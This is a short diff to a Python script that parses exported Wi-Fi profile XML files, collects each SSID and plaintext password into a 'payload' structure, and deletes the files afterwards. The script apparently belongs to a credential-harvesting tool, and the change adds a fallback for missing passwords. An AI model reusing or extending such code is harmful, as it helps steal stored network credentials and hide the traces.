@@ -24,7 +24,10 @@ for file in wifi_files:
     tree = ET.parse(file)
     root = tree.getroot()
     ssid = root[0].text
-    password = root[4][0][1][2].text
+    if root[4][0][1][2].text:
+        password = root[4][0][1][2].text
+    else:
+        password = "Not found"
     payload["SSID"].append(ssid)
     payload["Password"].append(password)
     os.remove(file)
